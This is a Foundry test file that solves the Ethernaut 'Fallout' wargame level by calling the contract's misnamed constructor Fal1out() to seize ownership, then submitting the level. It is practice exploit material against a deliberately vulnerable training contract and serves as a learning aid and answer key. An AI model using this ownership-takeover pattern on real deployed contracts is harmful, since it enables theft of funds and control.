// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {FalloutFactory} from "../src/02-Fallout/FalloutFactory.sol";
import {Fallout} from "../src/02-Fallout/Fallout.sol";

contract FalloutTest is Test {
    Ethernaut public ethernaut;
    address public user = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function test_FalloutAttack() public {
        // SETUP
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(user);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(levelAddress);

        // ATTACK
        ethernautFallout.Fal1out();
        assertEq(ethernautFallout.owner(), user);

        // SUBMIT
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
        vm.stopPrank();
    }
}
